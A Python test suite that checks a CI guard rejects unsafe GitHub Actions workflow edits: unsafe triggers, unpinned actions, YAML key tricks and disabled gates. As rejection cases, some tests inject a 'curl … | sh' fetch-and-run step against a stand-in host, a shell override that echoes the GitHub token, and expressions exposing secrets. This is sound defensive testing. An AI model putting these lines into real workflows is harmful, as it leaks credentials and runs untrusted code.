#!/usr/bin/env python3
"""Negative controls for CI runner routing policy."""
import pathlib
import shutil
import subprocess
import tempfile
import os
import unittest

ROOT = pathlib.Path(__file__).resolve().parent.parent
# Optional overrides, used only to show new controls fail on an older guard.
GUARD = pathlib.Path(os.environ.get("ELZOO_CI_GUARD", ROOT / "scripts" / "check-ci-runners.py"))
WORKFLOWS = pathlib.Path(os.environ.get("ELZOO_CI_WORKFLOWS", ROOT / ".github" / "workflows"))
IMAGE = "ubuntu:24.04@sha256:fe81560990fae86dc4743202b2cb4d3df98d0bcf949173cecef15ce1127ef852"


class RunnerPolicyTest(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = pathlib.Path(self.temp.name)
        (self.root / ".github").mkdir()
        shutil.copytree(WORKFLOWS, self.root / ".github" / "workflows")

    def tearDown(self):
        self.temp.cleanup()

    def check(self, expected):
        result = subprocess.run(
            ["python3", str(GUARD)],
            cwd=self.root, capture_output=True, text=True, check=False
        )
        self.assertEqual(expected, result.returncode, result.stdout + result.stderr)
        return result

    def change(self, filename, old, new):
        path = self.root / ".github" / "workflows" / filename
        source = path.read_text()
        self.assertIn(old, source)
        path.write_text(source.replace(old, new, 1))

    def change_all(self, filename, old, new):
        path = self.root / ".github" / "workflows" / filename
        source = path.read_text()
        self.assertIn(old, source)
        path.write_text(source.replace(old, new))

    def test_reviewed_routing_passes(self):
        self.check(0)


    def test_unknown_machine_selector_rejected(self):
        for selector in ("[ubuntu-24.04, other-machine]", "ubuntu-latest", "[ubuntu-24.04]", "${{ vars.RUNNER }}"):
            with self.subTest(selector=selector):
                self.change("symbolic-check.yml", self.BACKEND_SELECTOR, f"    runs-on: {selector}\n")
                self.check(1)
                self.tearDown()
                self.setUp()

    def test_branch_specific_candidate_route_rejected(self):
        self.change(
            "symbolic-check.yml",
            "runs-on: ubuntu-24.04",
            "runs-on: ${{ github.head_ref == 'task/ELZ-034' && fromJSON('[\"ubuntu-latest\"]') || fromJSON('[\"ubuntu-24.04\"]') }}",
        )
        self.check(1)

    # ELZ-040 controls: triggers, quoted keys and container image digests.
    def test_pull_request_target_rejected(self):
        self.change("symbolic-check.yml", "\n  pull_request:\n", "\n  pull_request_target:\n")
        self.check(1)

    def test_gleam_pull_request_target_rejected(self):
        self.change("symbolic-gleam.yml", "\n  pull_request:\n", "\n  pull_request_target:\n")
        self.check(1)

    def test_added_pull_request_target_rejected(self):
        self.change("symbolic-check.yml", "\n  workflow_dispatch:\n",
                    "\n  workflow_dispatch:\n  pull_request_target:\n")
        self.check(1)

    def test_unapproved_trigger_rejected(self):
        self.change("symbolic-check.yml", "\n  workflow_dispatch:\n",
                    "\n  workflow_dispatch:\n  workflow_run:\n    workflows: [other]\n")
        self.check(1)

    def test_push_branch_filter_cannot_widen(self):
        self.change("symbolic-gleam.yml", "branches: [main]", "branches: ['**']")
        self.check(1)

    def test_quoted_on_key_rejected(self):
        self.change("symbolic-check.yml", "\non:\n", '\n"on":\n')
        self.check(1)

    def test_quoted_runs_on_job_rejected(self):
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        path.write_text(path.read_text() + '\n  "evil":\n    "runs-on": ubuntu-latest\n    steps:\n      - run: true\n')
        self.check(1)



    def test_inline_container_image_rejected(self):
        self.change("symbolic-check.yml", "    steps:\n", "    container: ubuntu:latest\n    steps:\n")
        stderr = self.check(1).stderr
        self.assertIn("container must be a mapping with a digest-pinned image", stderr)
        self.assertIn("a hosted job must not use a job container", stderr)
        self.tearDown()
        self.setUp()
        self.change("symbolic-gleam.yml", "    steps:\n", "    container:\n      image: " + IMAGE + "\n    steps:\n")
        self.assertIn("a hosted job must not use a job container", self.check(1).stderr)

    def test_fork_pr_job_gate_cannot_be_removed(self):
        # The backend job runs for same-repository pull requests only; a fork pull request must not reach it.
        self.change(
            "symbolic-check.yml",
            "    if: ${{ github.event_name == 'push' || github.event_name == 'workflow_dispatch' || (github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository) }}",
            "    if: ${{ true }}",
        )
        self.check(1)

    def test_gleam_fork_pr_job_gate_cannot_be_removed(self):
        self.change(
            "symbolic-gleam.yml",
            "    if: ${{ github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository }}",
            "    if: ${{ true }}",
        )
        self.check(1)


    def test_additional_ungated_backend_job_rejected(self):
        self.add_ungated_job("symbolic-check.yml")
        self.check(1)

    def test_additional_ungated_gleam_job_rejected(self):
        self.add_ungated_job("symbolic-gleam.yml")
        self.check(1)

    def test_extra_backend_job_header_rejected_independently(self):
        self.add_job_header_without_selector("symbolic-check.yml")
        self.assertIn("exactly the jobs check-plan, check-root, check-consumers-db, check-consumers, check-hosted are required, in this order", self.check(1).stderr)

    def test_extra_gleam_job_header_rejected_independently(self):
        self.add_job_header_without_selector("symbolic-gleam.yml")
        self.assertIn("exactly one gleam-hosted job is required", self.check(1).stderr)

    def add_ungated_job(self, filename):
        path = self.root / ".github" / "workflows" / filename
        source = path.read_text()
        selector = next(line for line in source.splitlines() if line.strip().startswith("runs-on:"))
        path.write_text(source + f"\n  unreviewed:\n{selector}\n    steps:\n      - run: true\n")

    def add_job_header_without_selector(self, filename):
        path = self.root / ".github" / "workflows" / filename
        path.write_text(path.read_text() + "\n  unreviewed:\n    steps:\n      - run: true\n")


    def test_unknown_workflow_rejected(self):
        (self.root / ".github" / "workflows" / "extra.yml").write_text("jobs: {}\n")
        self.check(1)

    def test_missing_workflow_rejected(self):
        (self.root / ".github" / "workflows" / "symbolic-gleam.yml").unlink()
        self.check(1)

    def test_reusable_workflow_rejected(self):
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        path.write_text(path.read_text() + "\n      - uses: owner/repo/.github/workflows/ci.yml@main\n")
        self.check(1)


    # ELZ-042 controls: flow-style jobs and required job containers.
    def append(self, filename, text):
        path = self.root / ".github" / "workflows" / filename
        path.write_text(path.read_text() + text)

    def test_flow_style_backend_job_rejected(self):
        self.append("symbolic-check.yml", "  evil: {runs-on: ubuntu-latest, steps: [{run: 'true'}]}\n")
        self.assertIn("jobs must be block-style mappings", self.check(1).stderr)

    def test_flow_style_gleam_job_rejected(self):
        self.append("symbolic-gleam.yml", "  evil: {runs-on: ubuntu-latest, steps: [{run: 'true'}]}\n")
        self.assertIn("jobs must be block-style mappings", self.check(1).stderr)

    def test_explicit_key_flow_job_rejected(self):
        self.append("symbolic-check.yml", "  ? evil\n  : {runs-on: ubuntu-latest, steps: [{run: 'true'}]}\n")
        self.assertIn("jobs must be block-style mappings", self.check(1).stderr)





    # Script text and comments are not YAML keys (ELZ-040 review finding 3).
    def test_run_script_text_and_comments_allowed(self):
        # ELZ-057: apply to both backend jobs; their bodies must stay identical.
        self.change_all(
            "symbolic-check.yml",
            "          free -h || true\n",
            "          free -h || true\n"
            "          cat > /tmp/daemon.json <<'JSON'\n"
            "          {\"registry-mirrors\": []}\n"
            "          \"debug\": false\n"
            "          JSON\n"
            "          image: not-a-container-key\n"
            "          echo pull_request_target is not used here\n",
        )
        self.change("symbolic-gleam.yml", "\njobs:\n", "\n# No pull_request_target trigger.\njobs:\n")
        self.check(0)

    def test_quoted_key_after_run_script_still_rejected(self):
        self.change("symbolic-check.yml", "          free -h || true\n",
                    "          free -h || true\n        \"env\": {A: b}\n")
        self.check(1)

    def test_image_after_run_script_still_rejected(self):
        self.change("symbolic-check.yml", "          free -h || true\n",
                    "          free -h || true\n    services:\n      db:\n        image: postgres:latest\n")
        self.check(1)

    def test_explicit_indent_scalar_text_still_checked(self):
        self.change("symbolic-check.yml", "          free -h || true\n",
                    "          free -h || true\n      - run: |2\n          \"x\": y\n")
        self.check(1)


    # ELZ-042 review (PR #74 comment 6705035217) reproducers and fail-closed forms.
    BACKEND_SELECTOR = "    runs-on: ubuntu-24.04\n"
    GLEAM_SELECTOR = "    runs-on: ubuntu-24.04\n"

    def test_review_quoted_continuation_then_flow_job_rejected(self):
        self.append("symbolic-check.yml", '    environment: "a\nx"\n'
                                          '  evil: {runs-on: ubuntu-latest, steps: [{run: "true"}]}\n')
        self.check(1)

    def test_review_gleam_quoted_continuation_then_flow_job_rejected(self):
        self.append("symbolic-gleam.yml", '    environment: "a\nx"\n'
                                          '  evil: {runs-on: ubuntu-latest, steps: [{run: "true"}]}\n')
        self.check(1)

    def test_review_escaped_quote_continuation_rejected(self):
        self.append("symbolic-check.yml", '    environment: "a\\"\nx"\n')
        self.assertIn("quoted scalars must close on the same line", self.check(1).stderr)

    def test_review_explicit_runs_on_key_with_decoy_rejected(self):
        self.change("symbolic-check.yml", self.BACKEND_SELECTOR,
                    "    concurrency: |\n  " + self.BACKEND_SELECTOR + "    ? runs-on\n    : ubuntu-latest\n")
        self.check(1)

    def test_review_gleam_explicit_runs_on_key_with_decoy_rejected(self):
        self.change("symbolic-gleam.yml", self.GLEAM_SELECTOR,
                    "    name: |\n  " + self.GLEAM_SELECTOR + "    ? runs-on\n    : ubuntu-latest\n")
        self.check(1)

    def test_review_alias_runs_on_key_with_decoy_rejected(self):
        self.change("symbolic-check.yml", self.BACKEND_SELECTOR,
                    "    concurrency: |\n  " + self.BACKEND_SELECTOR
                    + "    environment: &k runs-on\n    *k : ubuntu-latest\n")
        self.check(1)

    def test_review_sequence_item_block_scalar_does_not_hide_keys(self):
        self.change("symbolic-check.yml", "    steps:\n",
                    '    steps:\n      - name: |\n        "run": echo hidden quoted key\n')
        self.assertIn("quoted YAML keys", self.check(1).stderr)

    def test_review_merge_key_rejected(self):
        self.change("symbolic-check.yml", "    timeout-minutes: 120\n",
                    "    timeout-minutes: 120\n    <<: {runs-on: ubuntu-latest}\n")
        self.assertIn("merge keys", self.check(1).stderr)

    def test_tagged_key_rejected(self):
        self.change("symbolic-check.yml", "    timeout-minutes: 120\n",
                    "    timeout-minutes: 120\n    !!str runs-on: ubuntu-latest\n")
        self.check(1)

    def test_multi_line_flow_collection_rejected(self):
        self.change("symbolic-check.yml", "    timeout-minutes: 120\n",
                    "    timeout-minutes: 120\n    environment: {name: a,\n      url: b}\n")
        self.assertIn("flow collections must close on the same line", self.check(1).stderr)

    def test_top_level_key_after_jobs_rejected(self):
        self.append("symbolic-gleam.yml", "env:\n  A: b\n")
        self.assertIn("jobs: must be the last top-level key", self.check(1).stderr)

    def test_second_document_rejected(self):
        self.append("symbolic-check.yml", "---\njobs: {}\n")
        self.check(1)

    def test_selector_only_in_script_text_rejected(self):
        self.change("symbolic-check.yml", self.BACKEND_SELECTOR, "    concurrency: |\n  " + self.BACKEND_SELECTOR)
        self.check(1)


    # ELZ-043 controls: split cache actions and every other action stay SHA-pinned.
    CACHE_SHA = "0057852bfaa89a56745cba8c7296529d2fc39830"

    def test_tag_pinned_cache_save_rejected(self):
        self.change("symbolic-check.yml", "actions/cache/save@" + self.CACHE_SHA, "actions/cache/save@v4")
        self.assertIn("pinned by a full commit SHA", self.check(1).stderr)

    def test_branch_pinned_cache_restore_rejected(self):
        self.change("symbolic-check.yml", "actions/cache/restore@" + self.CACHE_SHA, "actions/cache/restore@main")
        self.assertIn("pinned by a full commit SHA", self.check(1).stderr)

    def test_short_sha_action_rejected(self):
        self.change("symbolic-gleam.yml", "actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020",
                    "actions/setup-node@49933ea")
        self.assertIn("pinned by a full commit SHA", self.check(1).stderr)

    def test_unpinned_added_action_rejected(self):
        self.append("symbolic-check.yml", "      - uses: actions/cache@v4\n")
        self.assertIn("pinned by a full commit SHA", self.check(1).stderr)

    def test_flow_mapping_unpinned_step_rejected(self):
        self.append("symbolic-check.yml", "      - { uses: actions/cache@v4 }\n")
        self.assertIn("flow mappings are outside", self.check(1).stderr)

    def test_flow_mapping_in_flow_sequence_rejected(self):
        self.append("symbolic-check.yml", "      - [ { uses: actions/cache@v4 } ]\n")
        self.assertIn("flow mappings are outside", self.check(1).stderr)

    # ELZ-043 re-review (comment 6706080840) controls.
    GATE_START = "      - name: Verify the GitHub-hosted runner\n"
    GATE_END = "          free -h || true\n"

    def gate_text(self):
        source = (self.root / ".github" / "workflows" / "symbolic-check.yml").read_text()
        start = source.index(self.GATE_START)
        return source[start:source.index(self.GATE_END, start) + len(self.GATE_END)]

    def test_flow_sequence_step_mapping_rejected(self):
        self.append("symbolic-check.yml", "      - [ uses: actions/cache@main ]\n")
        self.assertIn("mappings inside flow sequences are outside", self.check(1).stderr)

    def test_one_line_steps_rejected(self):
        gate = self.gate_text()
        self.change("symbolic-check.yml", gate, "")
        self.change("symbolic-check.yml", "jobs:\n", "env:\n  NOTE: |\n" + gate + "\njobs:\n")
        self.change("symbolic-check.yml", "    steps:\n", "    steps: [ uses: docker://alpine:3 ]\n    old-steps:\n")
        stderr = self.check(1).stderr
        self.assertIn("mappings inside flow sequences are outside", stderr)
        self.assertIn("one block-style steps: list", stderr)

    def test_gate_only_in_block_scalar_rejected(self):
        gate = self.gate_text()
        self.change("symbolic-check.yml", gate, "")
        self.change("symbolic-check.yml", "jobs:\n", "env:\n  NOTE: |\n" + gate + "\njobs:\n")
        self.assertIn("approved runner identity gate is missing or changed", self.check(1).stderr)

    def test_uses_plain_continuation_rejected(self):
        pinned = "actions/cache/restore@" + self.CACHE_SHA + " # v4.3.0\n"
        self.change("symbolic-check.yml", pinned, pinned + "          actions/cache@v4\n")
        self.assertIn("plain-scalar continuation lines are outside", self.check(1).stderr)

    # ELZ-043 third review (comment 6706162316): the gate step cannot be switched off.
    def test_gate_step_if_rejected(self):
        self.change("symbolic-check.yml", self.GATE_END,
                    "        if: ${{ github.run_id == 0 }}\n" + self.GATE_END)
        self.assertIn("approved runner identity gate is missing or changed", self.check(1).stderr)

    def test_gate_step_continue_on_error_rejected(self):
        self.change("symbolic-check.yml", self.GATE_END, "        continue-on-error: true\n" + self.GATE_END)
        stderr = self.check(1).stderr
        self.assertIn("approved runner identity gate is missing or changed", stderr)
        self.assertIn("could disable the runner identity gate", stderr)

    def test_gate_step_shell_rejected(self):
        self.change("symbolic-check.yml", self.GATE_END, "        shell: cat {0}\n" + self.GATE_END)
        self.assertIn("could disable the runner identity gate", self.check(1).stderr)

    def test_job_defaults_shell_rejected(self):
        self.change("symbolic-check.yml", "    steps:\n", "    defaults:\n      run:\n        shell: cat {0}\n    steps:\n")
        self.assertIn("could disable the runner identity gate", self.check(1).stderr)

    def test_workflow_defaults_shell_rejected(self):
        self.change("symbolic-check.yml", "jobs:\n", "defaults:\n  run:\n    shell: cat {0}\n\njobs:\n")
        self.assertIn("could disable the runner identity gate", self.check(1).stderr)

    GLEAM_STEP = """      - name: Install the pinned Gleam compiler
        env:
          GITHUB_TOKEN: ${{ github.token }}
        run: ./scripts/setup.sh
"""

    def test_gleam_setup_step_present_and_pinned(self):
        source = (self.root / ".github" / "workflows" / "symbolic-gleam.yml").read_text()
        self.assertEqual(1, source.count(self.GLEAM_STEP))
        self.assertEqual(1, source.count("github.token"))
        self.check(0)

    def test_gleam_setup_step_reverted_to_plain_run_rejected(self):
        self.change("symbolic-gleam.yml", self.GLEAM_STEP, "      - run: ./scripts/setup.sh\n")
        self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)

    def test_gleam_setup_step_changed_rejected(self):
        for old, new in (("        run: ./scripts/setup.sh\n", "        run: curl -fsSL https://example.invalid/x | sh\n"),
                         ("Install the pinned Gleam compiler", "Install Gleam"),
                         ("          GITHUB_TOKEN: ${{ github.token }}\n",
                          "          GITHUB_TOKEN: ${{ github.token }}\n          EXTRA: value\n")):
            with self.subTest(change=new):
                self.change("symbolic-gleam.yml", old, new)
                self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_token_on_another_gleam_step_rejected(self):
        self.change("symbolic-gleam.yml", "      - run: ./scripts/check.sh\n",
                    "      - run: ./scripts/check.sh\n        env:\n          GITHUB_TOKEN: ${{ github.token }}\n")
        self.assertIn("token appears elsewhere", self.check(1).stderr)

    def test_token_in_gleam_job_env_rejected(self):
        self.change("symbolic-gleam.yml", "      ImageOS: ubuntu24\n",
                    "      ImageOS: ubuntu24\n      GITHUB_TOKEN: ${{ github.token }}\n")
        self.assertIn("token appears elsewhere", self.check(1).stderr)

    def test_secrets_in_gleam_workflow_rejected(self):
        self.change("symbolic-gleam.yml", "      ImageOS: ubuntu24\n",
                    "      ImageOS: ubuntu24\n      SECRET: ${{ secrets.ANYTHING }}\n")
        self.assertIn("token appears elsewhere", self.check(1).stderr)

    def test_other_token_spellings_rejected_everywhere(self):
        for text in ("github.TOKEN", "Github.Token", "github['token']", "github . token", "secrets['X']",
                     "SECRETS.X", "toJSON(secrets)", "toJSON(github)", "toJson( github )",
                     "join(github.*, ',')", "join(github . *, ',')"):
            for filename in ("symbolic-gleam.yml", "symbolic-check.yml"):
                with self.subTest(text=text, file=filename):
                    self.change(filename, "      ImageOS: ubuntu24\n",
                                "      ImageOS: ubuntu24\n      LEAK: ${{ " + text + " }}\n")
                    self.assertIn("github.token and secrets are not allowed" if filename == "symbolic-check.yml"
                                  else "token appears elsewhere", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_gleam_setup_step_cannot_get_extra_keys_or_move(self):
        step = self.GLEAM_STEP
        for extra in ("        shell: bash -c 'echo $GITHUB_TOKEN; bash {0}'\n", "        continue-on-error: true\n",
                      "        if: ${{ false }}\n", "        working-directory: /tmp\n",
                      # after a blank line or a comment line, the key still belongs to the step
                      "\n        shell: bash -c 'echo $GITHUB_TOKEN; bash {0}'\n",
                      "# note\n        shell: bash -c 'echo $GITHUB_TOKEN; bash {0}'\n",
                      "    # note\n        if: ${{ false }}\n"):
            with self.subTest(extra=extra.strip()):
                self.change("symbolic-gleam.yml", step, step + extra)
                self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)
                self.tearDown()
                self.setUp()
        # Moved before the checkout step: the step text is intact but its position is not.
        path = self.root / ".github" / "workflows" / "symbolic-gleam.yml"
        source = path.read_text().replace(step, "")
        marker = "      - name: Prepare Ubuntu job container\n"
        path.write_text(source.replace(marker, step + marker, 1))
        self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)

    def test_token_or_secrets_in_backend_workflow_rejected(self):
        for text in ("github.token", "secrets.ANYTHING"):
            with self.subTest(text=text):
                self.change("symbolic-check.yml", "      ImageOS: ubuntu24\n",
                            "      ImageOS: ubuntu24\n      LEAK: ${{ " + text + " }}\n")
                self.assertIn("not allowed in this workflow", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    # ELZ-058: the push job may skip a repeated full check; permissions, the token and the step
    # conditions are pinned so that skipping cannot spread to pull requests or hide a failure.
    # ELZ-071: the heavy steps also wait for the classification (a documentation-only run skips them).
    SKIP_IF = "        if: ${{ steps.skip.outputs.skip != 'true' && steps.class.outputs.docs_only != 'true' }}\n"
    DECISION = """      - name: Decide whether the full check is redundant
        id: skip
        env:
          GITHUB_TOKEN: ${{ github.token }}
        run: python3 scripts/ci-skip-decision.py
"""
    ANY_PERMS = "    permissions:\n      actions: read\n      contents: read\n"

    def source(self):
        return (self.root / ".github" / "workflows" / "symbolic-check.yml").read_text()

    def test_decision_step_and_permissions_present_and_pinned(self):
        source = self.source()
        self.assertEqual(1, source.count(self.DECISION))
        self.assertEqual(1, source.count(self.ANY_PERMS))
        self.assertEqual(4, source.count("github.token"))  # the decision step and the S3 test server step of each work job
        self.assertEqual(6, source.count("permissions:"))  # top level and the five jobs
        self.check(0)

    def test_write_permissions_rejected(self):
        for old, new in ((self.ANY_PERMS, "    permissions:\n      actions: write\n      contents: read\n"),
                         (self.ANY_PERMS, "    permissions:\n      actions: read\n      contents: write\n"),
                         (self.ANY_PERMS, "    permissions: write-all\n"),
                         ("permissions:\n  contents: read\n", "permissions:\n  contents: write\n"),
                         ("permissions:\n  contents: read\n", "permissions: write-all\n"),
                         ("permissions:\n  contents: read\n", "permissions:\n  contents: read\n  id-token: write\n")):
            with self.subTest(new=new.strip()):
                self.change("symbolic-check.yml", old, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_check_any_permissions_removed_or_widened_rejected(self):
        for new in ("", "    permissions:\n      contents: read\n",
                    "    permissions:\n      actions: read\n      contents: read\n      checks: read\n",
                    "    permissions:\n      contents: read\n      actions: read\n"):
            with self.subTest(new=new):
                self.change("symbolic-check.yml", self.ANY_PERMS, new)
                self.assertIn("job header lines below runs-on changed", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_gleam_workflow_permissions_stay_contents_read(self):
        self.change("symbolic-gleam.yml", "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  actions: read\n")
        self.assertIn("token permissions must be exactly the reviewed ones", self.check(1).stderr)

    def test_decision_step_removed_rejected(self):
        self.change("symbolic-check.yml", self.DECISION, "")
        stderr = self.check(1).stderr
        self.assertIn("the pinned decision step is missing or changed (check-plan)", stderr)

    def test_decision_step_changes_rejected(self):
        for old, new in (("        run: python3 scripts/ci-skip-decision.py\n", "        run: python3 scripts/ci-skip-decision.py --force\n"),
                         ("        id: skip\n", "        id: skipper\n"),
                         ("      - name: Decide whether the full check is redundant\n", "      - name: Decide\n"),
                         ("          GITHUB_TOKEN: ${{ github.token }}\n", "          GITHUB_TOKEN: ${{ github.token }}\n          EXTRA: x\n"),
                         ("        run: python3 scripts/ci-skip-decision.py\n",
                          "        run: python3 scripts/ci-skip-decision.py\n        continue-on-error: true\n"),
                         ("        run: python3 scripts/ci-skip-decision.py\n",
                          "        run: python3 scripts/ci-skip-decision.py\n        shell: bash -c 'echo $GITHUB_TOKEN; bash {0}'\n")):
            with self.subTest(new=new.strip()):
                self.change_all("symbolic-check.yml", old, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_decision_step_must_follow_the_guard_tests_and_precede_setup(self):
        source = self.source()
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        moved = source.replace(self.DECISION, "")
        marker = "      - run: python3 scripts/test-ci-skip.py\n"
        path.write_text(moved.replace(marker, self.DECISION + marker))  # now before the skip tests, not after them
        self.assertIn("the pinned decision step is missing or changed", self.check(1).stderr)
        # and moved to the end of the steps, after the full check
        end = moved.rstrip("\n") + "\n"
        path.write_text(end.replace("\n  check-any:\n", "\n" + self.DECISION + "\n  check-any:\n", 1)
                        + self.DECISION)
        self.assertIn("the pinned decision step is missing or changed", self.check(1).stderr)

    def test_token_on_other_backend_steps_or_env_rejected(self):
        for old, new in (("      - run: mix setup\n", "      - run: mix setup\n        env:\n          GITHUB_TOKEN: ${{ github.token }}\n"),
                         ("      ImageOS: ubuntu24\n", "      ImageOS: ubuntu24\n      GITHUB_TOKEN: ${{ github.token }}\n"),
                         ("      - run: python3 scripts/check-claims.py\n", "      - run: python3 scripts/check-claims.py\n        env:\n          T: ${{ secrets.X }}\n")):
            with self.subTest(new=new.strip()):
                self.change("symbolic-check.yml", old, new)
                self.assertIn("not allowed in this workflow", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_run_mix_check_condition_is_pinned(self):
        for job, part in (("check-root", "root"), ("check-consumers-db", "consumers-db"), ("check-consumers", "consumers")):
            step = f"      - name: Run mix check\n        run: sh scripts/run-ci-check.sh --part {part}\n"
            for new in (f"      - name: Run mix check\n        if: ${{{{ false }}}}\n        run: sh scripts/run-ci-check.sh --part {part}\n",
                        f"      - name: Run mix check\n        if: ${{{{ always() }}}}\n        run: sh scripts/run-ci-check.sh --part {part}\n",
                        f"      - name: Run mix check\n        if: ${{{{ github.event_name == 'push' }}}}\n        run: sh scripts/run-ci-check.sh --part {part}\n",
                        f"      - name: Run mix check\n        run: sh scripts/run-ci-check.sh --part {part} || true\n",
                        f"      - name: Run mix check\n        continue-on-error: true\n        run: sh scripts/run-ci-check.sh --part {part}\n",
                        f"      - name: Run mix check\n        run: sh scripts/run-ci-check.sh\n",
                        f"      - name: Run mix check\n        run: sh scripts/run-ci-check.sh --affected origin/main\n",
                        f"      - name: Run mix check\n        run: sh scripts/run-ci-check.sh --part {part} --part root\n",
                        ""):
                with self.subTest(job=job, new=new.strip()[:70]):
                    self.change_in_job("symbolic-check.yml", job, step, new)
                    self.assertIn(f"the pinned step \"name: Run mix check\" is missing or changed ({job})", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_each_work_job_runs_its_own_part_and_no_other(self):
        # Swapping the parts of two jobs would run a part twice and another never: the step is pinned per job.
        parts = {"check-root": "root", "check-consumers-db": "consumers-db", "check-consumers": "consumers"}
        for job, part in parts.items():
            for other in parts.values():
                if other == part:
                    continue
                with self.subTest(job=job, part=other):
                    self.change_in_job("symbolic-check.yml", job, f"--part {part}\n", f"--part {other}\n")
                    self.assertIn("the pinned step \"name: Run mix check\" is missing or changed", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_run_mix_check_step_cannot_be_removed_from_a_work_job(self):
        for job, part in (("check-root", "root"), ("check-consumers-db", "consumers-db"), ("check-consumers", "consumers")):
            with self.subTest(job=job):
                self.change_in_job("symbolic-check.yml", job, f"      - name: Run mix check\n        run: sh scripts/run-ci-check.sh --part {part}\n", "")
                self.assertIn(f"the pinned step \"name: Run mix check\" is missing or changed ({job})", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_the_plan_job_and_the_aggregating_job_do_not_run_mix_check(self):
        for job in ("check-plan", "check-hosted"):
            with self.subTest(job=job):
                self.change_in_job("symbolic-check.yml", job, "      - name: Verify the GitHub-hosted runner\n",
                                   "      - name: Run mix check\n        run: sh scripts/run-ci-check.sh --part root\n      - name: Verify the GitHub-hosted runner\n")
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_other_steps_cannot_gain_or_lose_conditions(self):
        for job, old, new in (("check-root", "      - name: Install runtime libraries\n", "      - name: Install runtime libraries\n        if: ${{ false }}\n"),
                              ("check-plan", "      - run: python3 scripts/check-claims.py\n", "      - run: python3 scripts/check-claims.py\n        if: ${{ false }}\n"),
                              ("check-root", "      - run: mix setup\n", "      - run: mix setup\n        if: ${{ false }}\n"),
                              ("check-consumers", "      - uses: erlef/setup-beam@54075bcc5e249e4758d363f27d099f55d843f124 # v1\n",
                               "      - uses: erlef/setup-beam@54075bcc5e249e4758d363f27d099f55d843f124 # v1\n        if: ${{ needs.check-plan.outputs.run == 'true' }}\n"),
                              ("check-root", "        if: always()\n", "        if: ${{ success() }}\n"),
                              ("check-consumers-db", "        if: always()\n", "        if: ${{ success() }}\n"),
                              ("check-root", "        if: ${{ steps.deps-cache.outputs.cache-hit != 'true' }}\n", ""),
                              ("check-root", "        if: ${{ steps.deps-cache.outputs.cache-hit != 'true' }}\n",
                               "        if: ${{ steps.deps-cache.outputs.cache-hit != 'false' }}\n"),
                              ("check-root", "        if: ${{ steps.minio.outputs.source != 'cache' }}\n", "")):
            with self.subTest(job=job, new=new.strip()[:60]):
                self.change_in_job("symbolic-check.yml", job, old, new)
                self.assertIn("step-level conditions are not the reviewed ones", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    CHECKOUT = """      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false
"""

    def test_checkout_must_not_persist_the_token(self):
        self.assertEqual(4, self.source().count(self.CHECKOUT))     # check-plan and the three work jobs
        for job in ("check-plan", "check-root", "check-consumers-db", "check-consumers"):
            for new in (self.CHECKOUT.replace("          persist-credentials: false\n", ""),
                        self.CHECKOUT.replace("persist-credentials: false", "persist-credentials: true"),
                        self.CHECKOUT.replace("fetch-depth: 0", "fetch-depth: 1"),
                        self.CHECKOUT + "          token: ${{ secrets.X }}\n",
                        self.CHECKOUT + "          ref: main\n",
                        self.CHECKOUT + "          repository: someone/else\n",
                        self.CHECKOUT + "          persist-credentials: true\n"):
                with self.subTest(job=job, new=new.strip()[-40:]):
                    self.change_in_job("symbolic-check.yml", job, self.CHECKOUT, new)
                    self.assertTrue(self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_the_aggregating_job_does_not_check_out_the_repository(self):
        self.change_in_job("symbolic-check.yml", "check-hosted", "      - name: Require every job\n",
                           self.CHECKOUT + "      - name: Require every job\n")
        self.assertIn("must not check out the repository (check-hosted)", self.check(1).stderr)

    def test_checkout_without_persist_credentials_false_rejected(self):
        for job in ("check-plan", "check-root", "check-consumers-db", "check-consumers"):
            with self.subTest(job=job):
                self.change_in_job("symbolic-check.yml", job, "          persist-credentials: false\n", "")
                self.assertIn(f"the pinned checkout step (persist-credentials: false) is missing or changed ({job})", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_header_form_and_oddly_indented_if_keys_rejected(self):
        for old, new in (("      - run: python3 scripts/check-claims.py\n", "      - if: ${{ github.event_name != 'push' }}\n        run: python3 scripts/check-claims.py\n"),
                         ("      - run: python3 scripts/check-ci-runners.py\n", "      -   run: python3 scripts/check-ci-runners.py\n          if: ${{ false }}\n"),
                         ("      - run: python3 scripts/test-ci-runners.py\n", "      - run: python3 scripts/test-ci-runners.py\n         if: ${{ false }}\n")):
            with self.subTest(new=new.strip()[:50]):
                self.change_all("symbolic-check.yml", old, new)
                self.assertIn("unreviewed if: key", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_decision_step_cannot_gain_working_directory_or_timeout(self):
        for extra in ("        working-directory: /tmp\n", "        timeout-minutes: 1\n"):
            with self.subTest(extra=extra.strip()):
                self.change_all("symbolic-check.yml", "        run: python3 scripts/ci-skip-decision.py\n",
                                "        run: python3 scripts/ci-skip-decision.py\n" + extra)
                self.assertIn("the pinned decision step is missing or changed", self.check(1).stderr)
                self.tearDown()
                self.setUp()


    def test_skip_and_decision_scripts_exist_and_run_in_the_job(self):
        source = self.source()
